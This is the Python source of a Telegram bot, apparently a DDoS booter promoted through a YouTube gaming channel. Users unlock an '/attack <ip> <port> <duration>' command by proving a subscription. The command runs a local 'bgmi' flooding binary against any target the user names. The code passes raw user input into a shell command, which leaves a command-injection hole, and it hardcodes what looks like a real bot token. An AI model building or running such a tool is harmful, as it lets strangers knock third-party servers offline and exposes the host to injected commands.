import asyncio
import os
import json
import time
import re
import requests
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackContext, CallbackQueryHandler, filters

# ============= KEEP ALIVE (Comment if not needed) =============
try:
    from keep_alive import keep_alive
    keep_alive()
except:
    print("Keep alive not available, running without it")

# ============= CONFIGURATION =============
# Use environment variable for security
TELEGRAM_BOT_TOKEN = os.environ.get('BOT_TOKEN', '8179448288:AAGzOSPYhhGjUiTr2h-UMzbaSPmYnAaUjbY')
ADMIN_USER_ID = 7352008650

# YouTube Channel Settings
YOUTUBE_CHANNEL_HANDLE = "@ROXZ_GAMING"
YOUTUBE_CHANNEL_LINK = "https://youtube.com/@ROXZ_GAMING"
YOUTUBE_CHANNEL_NAME = "ROXZ_GAMING"

# Bot Settings
REQUIRED_SUBSCRIBERS = 1000
USERS_FILE = 'users.txt'
PENDING_FILE = 'pending_verification.json'
VERIFIED_FILE = 'verified_users.json'
LAST_COUNT_FILE = 'last_subscriber_count.txt'

# Attack settings
attack_in_progress = False

# ============= FILE HANDLING =============
def load_users():
    try:
        with open(USERS_FILE, 'r') as f:
            return set(line.strip() for line in f if line.strip())
    except FileNotFoundError:
        return set()

def save_users(users):
    try:
        with open(USERS_FILE, 'w') as f:
            for user in users:
                f.write(f"{user}\n")
    except Exception:
        pass

def load_pending():
    try:
        with open(PENDING_FILE, 'r') as f:
            return json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        return {}

def save_pending(pending):
    try:
        with open(PENDING_FILE, 'w') as f:
            json.dump(pending, f, indent=4)
    except Exception:
        pass

def load_verified():
    try:
        with open(VERIFIED_FILE, 'r') as f:
            return json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        return {}

def save_verified(verified):
    try:
        with open(VERIFIED_FILE, 'w') as f:
            json.dump(verified, f, indent=4)
    except Exception:
        pass

def get_last_count():
    try:
        with open(LAST_COUNT_FILE, 'r') as f:
            return int(f.read().strip())
    except (FileNotFoundError, ValueError):
        return 0

def save_last_count(count):
    try:
        with open(LAST_COUNT_FILE, 'w') as f:
            f.write(str(count))
    except Exception:
        pass

users = load_users()
pending_verification = load_pending()
verified_users = load_verified()

# ============= AUTO SUBSCRIBER FETCH =============
def fetch_youtube_subscribers():
    try:
        channel_url = f"https://www.youtube.com/{YOUTUBE_CHANNEL_HANDLE}"
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        
        response = requests.get(channel_url, headers=headers, timeout=10)
        
        patterns = [
            r'"subscriberCountText":.*?"(\d+(?:\.\d+)?[KMB]?)"',
            r'(\d+(?:\.\d+)?[KMB]?)\s+subscribers',
            r'<meta itemprop="subscriberCount" content="(\d+)"',
        ]
        
        for pattern in patterns:
            match = re.search(pattern, response.text, re.IGNORECASE)
            if match:
                count_str = match.group(1)
                return parse_count_string(count_str)
    except Exception as e:
        print(f"Fetch failed: {e}")
    
    return get_last_count()

def parse_count_string(count_str):
    count_str = count_str.upper().strip()
    
    if 'K' in count_str:
        return int(float(count_str.replace('K', '')) * 1000)
    elif 'M' in count_str:
        return int(float(count_str.replace('M', '')) * 1000000)
    elif 'B' in count_str:
        return int(float(count_str.replace('B', '')) * 1000000000)
    else:
        num_str = re.sub(r'[^\d]', '', count_str)
        return int(num_str) if num_str else 0

def get_current_subs():
    count = fetch_youtube_subscribers()
    if count > 0:
        save_last_count(count)
        return count
    return get_last_count()

# ============= CHECK BGMI BINARY =============
def check_bgmi_binary():
    """Check if bgmi binary exists and is executable"""
    if os.path.exists('./bgmi'):
        if os.access('./bgmi', os.X_OK):
            return True
        else:
            # Try to chmod
            try:
                os.chmod('./bgmi', 0o755)
                return True
            except:
                return False
    return False

# ============= TELEGRAM BOT HANDLERS =============
async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = str(update.effective_user.id)
    first_name = update.effective_user.first_name or "Warrior"
    
    current_subs = get_current_subs()
    
    keyboard = [
        [InlineKeyboardButton("🎯 SUBSCRIBE NOW 🎯", url=YOUTUBE_CHANNEL_LINK)],
        [InlineKeyboardButton("✅ I HAVE SUBSCRIBED ✅", callback_data="check_sub")],
        [InlineKeyboardButton("📊 CHECK COUNT", callback_data="check_count")],
        [InlineKeyboardButton("🔗 JOIN COMMUNITY", url="https://t.me/ROXZ_GAMING")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    if current_subs < REQUIRED_SUBSCRIBERS:
        message = f"""
🔥 *WELCOME {first_name.upper()}!* 🔥

🔒 *BOT STATUS: LOCKED*
📊 *Subscribers:* {current_subs:,} / {REQUIRED_SUBSCRIBERS:,}
📉 *Remaining:* {REQUIRED_SUBSCRIBERS - current_subs:,}

*⚡ TO UNLOCK:*
1️⃣ Subscribe to {YOUTUBE_CHANNEL_NAME}
2️⃣ Click 'I HAVE SUBSCRIBED'
3️⃣ Send screenshot
4️⃣ Get verified

🔗 @ROXZ_GAMING
"""
    else:
        if user_id in users or user_id == str(ADMIN_USER_ID):
            message = f"""
🔥 *WELCOME BACK {first_name.upper()}!* 🔥

✅ *BOT STATUS: ACTIVE*
🎉 *{REQUIRED_SUBSCRIBERS:,} SUBS ACHIEVED!*

*⚔️ READY FOR ATTACK!*
Use `/help` for commands

🔗 @ROXZ_GAMING
"""
        else:
            message = f"""
🔥 *WELCOME {first_name.upper()}!* 🔥

🎉 *BOT IS UNLOCKED!*

*⚡ TO GET ACCESS:*
1️⃣ Subscribe to {YOUTUBE_CHANNEL_NAME}
2️⃣ Click 'I HAVE SUBSCRIBED'
3️⃣ Send screenshot

🔗 @ROXZ_GAMING
"""
    
    await context.bot.send_message(
        chat_id=chat_id, 
        text=message, 
        parse_mode='Markdown',
        reply_markup=reply_markup
    )

async def check_subscription_callback(update: Update, context: CallbackContext):
    query = update.callback_query
    await query.answer()
    
    chat_id = query.message.chat_id
    user_id = str(query.from_user.id)
    first_name = query.from_user.first_name
    
    current_subs = get_current_subs()
    
    if current_subs < REQUIRED_SUBSCRIBERS:
        await query.edit_message_text(
            text=f"⚠️ *BOT LOCKED!*\nNeed {REQUIRED_SUBSCRIBERS:,} subscribers.\nCurrent: {current_subs:,}",
            parse_mode='Markdown'
        )
        return
    
    if user_id in users:
        await query.edit_message_text(
            text="✅ *ALREADY VERIFIED!*\nUse `/help` to start attacking.",
            parse_mode='Markdown'
        )
        return
    
    if user_id in pending_verification:
        await query.edit_message_text(
            text="⏳ *VERIFICATION PENDING!*\nPlease wait for admin approval.",
            parse_mode='Markdown'
        )
        return
    
    pending_verification[user_id] = {
        "name": first_name,
        "user_id": user_id,
        "timestamp": time.time(),
        "date": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "status": "pending"
    }
    save_pending(pending_verification)
    
    keyboard = [
        [InlineKeyboardButton("✅ APPROVE", callback_data=f"approve_{user_id}"),
         InlineKeyboardButton("❌ REJECT", callback_data=f"reject_{user_id}")]
    ]
    admin_markup = InlineKeyboardMarkup(keyboard)
    
    await context.bot.send_message(
        chat_id=ADMIN_USER_ID,
        text=f"🆕 *NEW REQUEST*\n👤 {first_name}\n🆔 `{user_id}`",
        parse_mode='Markdown',
        reply_markup=admin_markup
    )
    
    await query.edit_message_text(
        text="📸 *VERIFICATION REQUEST SENT!*\n\nSend screenshot of your subscription.\nAdmin will verify shortly.",
        parse_mode='Markdown'
    )

async def handle_screenshot(update: Update, context: CallbackContext):
    user_id = str(update.effective_user.id)
    chat_id = update.effective_chat.id
    first_name = update.effective_user.first_name
    
    if user_id not in pending_verification:
        await context.bot.send_message(
            chat_id=chat_id,
            text="⚠️ Please click 'I HAVE SUBSCRIBED' button first!",
            parse_mode='Markdown'
        )
        return
    
    photo = update.message.photo[-1]
    file = await context.bot.get_file(photo.file_id)
    
    os.makedirs("screenshots", exist_ok=True)
    screenshot_path = f"screenshots/{user_id}_{int(time.time())}.jpg"
    await file.download_to_drive(screenshot_path)
    
    pending_verification[user_id]["screenshot"] = screenshot_path
    pending_verification[user_id]["screenshot_time"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    save_pending(pending_verification)
    
    keyboard = [
        [InlineKeyboardButton("✅ APPROVE", callback_data=f"approve_{user_id}"),
         InlineKeyboardButton("❌ REJECT", callback_data=f"reject_{user_id}")]
    ]
    admin_markup = InlineKeyboardMarkup(keyboard)
    
    await context.bot.send_photo(
        chat_id=ADMIN_USER_ID,
        photo=photo.file_id,
        caption=f"📸 *SCREENSHOT*\n👤 {first_name}\n🆔 `{user_id}`",
        parse_mode='Markdown',
        reply_markup=admin_markup
    )
    
    await context.bot.send_message(
        chat_id=chat_id,
        text="✅ *SCREENSHOT RECEIVED!*\nAdmin will verify soon.",
        parse_mode='Markdown'
    )

async def admin_approval_callback(update: Update, context: CallbackContext):
    query = update.callback_query
    await query.answer()
    
    data = query.data
    
    if data.startswith("approve_"):
        user_id = data.replace("approve_", "")
        
        if user_id in pending_verification:
            users.add(user_id)
            save_users(users)
            
            verified_users[user_id] = pending_verification[user_id]
            verified_users[user_id]["verified_at"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            save_verified(verified_users)
            
            del pending_verification[user_id]
            save_pending(pending_verification)
            
            await context.bot.send_message(
                chat_id=int(user_id),
                text="✅ *VERIFIED!*\nYou can now use `/attack` command.",
                parse_mode='Markdown'
            )
            
            await query.edit_message_caption(
                caption=f"✅ APPROVED - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
                parse_mode='Markdown'
            )
    
    elif data.startswith("reject_"):
        user_id = data.replace("reject_", "")
        
        if user_id in pending_verification:
            await context.bot.send_message(
                chat_id=int(user_id),
                text="❌ *REJECTED!*\nPlease try again with correct screenshot.",
                parse_mode='Markdown'
            )
            
            del pending_verification[user_id]
            save_pending(pending_verification)
            
            await query.edit_message_caption(
                caption=f"❌ REJECTED - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
                parse_mode='Markdown'
            )

async def check_count_callback(update: Update, context: CallbackContext):
    query = update.callback_query
    await query.answer()
    
    count = get_current_subs()
    
    await query.edit_message_text(
        text=f"""
📊 *SUBSCRIBER COUNT*

📺 {YOUTUBE_CHANNEL_NAME}
👥 *{count:,}* / {REQUIRED_SUBSCRIBERS:,}

*Status:* {'✅ UNLOCKED' if count >= REQUIRED_SUBSCRIBERS else '🔒 LOCKED'}

🔗 {YOUTUBE_CHANNEL_LINK}
""",
        parse_mode='Markdown'
    )

async def help_command(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = str(update.effective_user.id)
    
    current_subs = get_current_subs()
    
    if current_subs < REQUIRED_SUBSCRIBERS:
        await context.bot.send_message(
            chat_id=chat_id,
            text=f"🔒 *BOT LOCKED!*\nNeed {REQUIRED_SUBSCRIBERS:,} subscribers.",
            parse_mode='Markdown'
        )
        return
    
    help_text = """
*📚 COMMANDS*

`/start` - Welcome & status
`/help` - This menu
`/attack <ip> <port> <duration>` - Launch attack
`/status` - Your verification status
`/subs` - Check subscriber count

*Example:*
`/attack 1.1.1.1 80 60`

🔗 @ROXZ_GAMING
"""
    
    if chat_id == ADMIN_USER_ID:
        help_text += """
*ADMIN:*
`/refresh` - Update subs
`/pending` - Pending users
`/broadcast <msg>` - Message all
`/stats` - Bot stats
"""
    
    await context.bot.send_message(chat_id=chat_id, text=help_text, parse_mode='Markdown')

async def attack(update: Update, context: CallbackContext):
    global attack_in_progress
    
    chat_id = update.effective_chat.id
    user_id = str(update.effective_user.id)
    args = context.args
    
    current_subs = get_current_subs()
    
    if current_subs < REQUIRED_SUBSCRIBERS:
        await context.bot.send_message(chat_id=chat_id, text="🔒 *BOT LOCKED!*", parse_mode='Markdown')
        return
    
    if user_id not in users and chat_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="⚠️ *Not verified!*", parse_mode='Markdown')
        return
    
    if attack_in_progress:
        await context.bot.send_message(chat_id=chat_id, text="⚠️ *Attack in progress!*", parse_mode='Markdown')
        return
    
    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="⚠️ Usage: `/attack <ip> <port> <duration>`", parse_mode='Markdown')
        return
    
    ip, port, duration = args
    
    # Check bgmi binary
    if not check_bgmi_binary():
        await context.bot.send_message(
            chat_id=chat_id,
            text="❌ *Attack binary missing!*\nContact admin to fix.",
            parse_mode='Markdown'
        )
        return
    
    attack_in_progress = True
    
    await context.bot.send_message(
        chat_id=chat_id,
        text=f"⚔️ *ATTACKING* `{ip}:{port}` for {duration}s",
        parse_mode='Markdown'
    )
    
    try:
        process = await asyncio.create_subprocess_shell(
            f"./bgmi {ip} {port} {duration}",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        await process.communicate()
    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"❌ *Error:* {str(e)}", parse_mode='Markdown')
    finally:
        attack_in_progress = False
        await context.bot.send_message(chat_id=chat_id, text="✅ *ATTACK COMPLETED!*", parse_mode='Markdown')

async def status_command(update: Update, context: CallbackContext):
    user_id = str(update.effective_user.id)
    chat_id = update.effective_chat.id
    
    if user_id in users:
        await context.bot.send_message(chat_id=chat_id, text="✅ *VERIFIED* - You can attack!", parse_mode='Markdown')
    elif user_id in pending_verification:
        await context.bot.send_message(chat_id=chat_id, text="⏳ *PENDING* - Wait for admin", parse_mode='Markdown')
    else:
        await context.bot.send_message(chat_id=chat_id, text="⚠️ *NOT VERIFIED* - Use /start", parse_mode='Markdown')

async def subs_command(update: Update, context: CallbackContext):
    count = get_current_subs()
    await context.bot.send_message(
        chat_id=update.effective_chat.id,
        text=f"📊 *Subscribers:* {count:,} / {REQUIRED_SUBSCRIBERS:,}",
        parse_mode='Markdown'
    )

# ============= ADMIN COMMANDS =============
async def refresh_subs(update: Update, context: CallbackContext):
    if update.effective_chat.id != ADMIN_USER_ID:
        return
    
    await update.message.reply_text("🔄 Fetching...")
    count = fetch_youtube_subscribers()
    await update.message.reply_text(f"✅ Current subscribers: {count:,}")

async def pending_list(update: Update, context: CallbackContext):
    if update.effective_chat.id != ADMIN_USER_ID:
        return
    
    if not pending_verification:
        await update.message.reply_text("✅ No pending")
        return
    
    text = "*PENDING USERS:*\n"
    for uid, data in pending_verification.items():
        text += f"\n👤 {data['name']}\n🆔 `{uid}`"
    
    await update.message.reply_text(text, parse_mode='Markdown')

async def broadcast(update: Update, context: CallbackContext):
    if update.effective_chat.id != ADMIN_USER_ID:
        return
    
    if not context.args:
        await update.message.reply_text("Usage: /broadcast <message>")
        return
    
    message = ' '.join(context.args)
    success = 0
    
    for user_id in users:
        try:
            await context.bot.send_message(chat_id=int(user_id), text=f"📢 {message}")
            success += 1
        except:
            pass
    
    await update.message.reply_text(f"✅ Sent to {success} users")

async def stats(update: Update, context: CallbackContext):
    if update.effective_chat.id != ADMIN_USER_ID:
        return
    
    text = f"""
📊 *STATS*
├ Users: {len(users)}
├ Pending: {len(pending_verification)}
├ Subscribers: {get_current_subs():,}
└ Target: {REQUIRED_SUBSCRIBERS:,}
"""
    await update.message.reply_text(text, parse_mode='Markdown')

# ============= MAIN =============
def main():
    print("🤖 Starting bot...")
    print(f"📺 Channel: {YOUTUBE_CHANNEL_NAME}")
    print(f"🎯 Target: {REQUIRED_SUBSCRIBERS} subscribers")
    print(f"✅ BGMI binary: {'Found' if check_bgmi_binary() else 'NOT FOUND'}")
    
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    
    # User commands
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("status", status_command))
    application.add_handler(CommandHandler("subs", subs_command))
    
    # Admin commands
    application.add_handler(CommandHandler("refresh", refresh_subs))
    application.add_handler(CommandHandler("pending", pending_list))
    application.add_handler(CommandHandler("broadcast", broadcast))
    application.add_handler(CommandHandler("stats", stats))
    
    # Message handlers
    application.add_handler(MessageHandler(filters.PHOTO, handle_screenshot))
    
    # Callback handlers
    application.add_handler(CallbackQueryHandler(check_subscription_callback, pattern="check_sub"))
    application.add_handler(CallbackQueryHandler(check_count_callback, pattern="check_count"))
    application.add_handler(CallbackQueryHandler(admin_approval_callback, pattern="^(approve_|reject_)"))
    
    print("✅ Bot is running!")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == '__main__':
    main()